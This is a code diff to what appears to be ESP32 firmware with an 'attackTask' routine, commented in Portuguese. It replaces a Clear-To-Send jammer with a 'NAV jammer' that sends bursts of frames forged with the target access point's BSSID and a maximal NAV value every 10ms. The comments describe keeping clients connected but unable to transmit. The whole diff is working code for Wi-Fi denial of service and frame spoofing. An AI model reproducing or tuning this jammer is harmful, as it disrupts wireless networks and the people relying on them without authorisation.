@@ -136,7 +136,9 @@ void attackTask(void *parameter) {
       }
     }
 
-    // CTS JAMMER — trava o canal com frames Clear-To-Send
+    // NAV JAMMER — flood QoS Null Data com BSSID forjado do AP alvo
+    // NAV puro: NÃO desconecta — apenas congela o canal.
+    // Clientes ficam "conectados" mas sem conseguir transmitir.
     else if (ctsAtivo && radioLocked) {
       if (xSemaphoreTake(wifiMutex, pdMS_TO_TICKS(50))) {
 
@@ -149,21 +151,20 @@ void attackTask(void *parameter) {
           esp_wifi_set_channel(canal_alvo, WIFI_SECOND_CHAN_NONE);
         }
 
-        // CTS Jamming: 1 frame por ciclo — NAV dura 32.767ms,
-        // ciclo de ~30ms mantém canal travado quase sem gap
-        static const uint8_t fake_unicast_mac[] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
-
-        esp_err_t ret = wsl_bypasser_send_cts_frame(fake_unicast_mac);
-        if (ret == ESP_OK) {
-          ctsCounter++;
+        // Burst de 8 QoS Null frames com NAV=32767μs
+        // BSSID forjado = AP alvo → clientes reconhecem e honram NAV
+        // Sem deauth: mantém conexão, mata velocidade
+        for (int i = 0; i < 8; i++) {
+          esp_err_t ret = wsl_bypasser_send_cts_frame(apRecordSelecionado.bssid);
+          if (ret == ESP_OK) ctsCounter++;
         }
 
         xSemaphoreGive(wifiMutex);
 
-        // 30ms: NAV (32.767ms) > ciclo (30ms) → canal permanece travado
-        vTaskDelay(pdMS_TO_TICKS(30));
-      } else {
+        // 10ms entre bursts — NAV de 32ms cobre gaps
         vTaskDelay(pdMS_TO_TICKS(10));
+      } else {
+        vTaskDelay(pdMS_TO_TICKS(5));
       }
     }
 
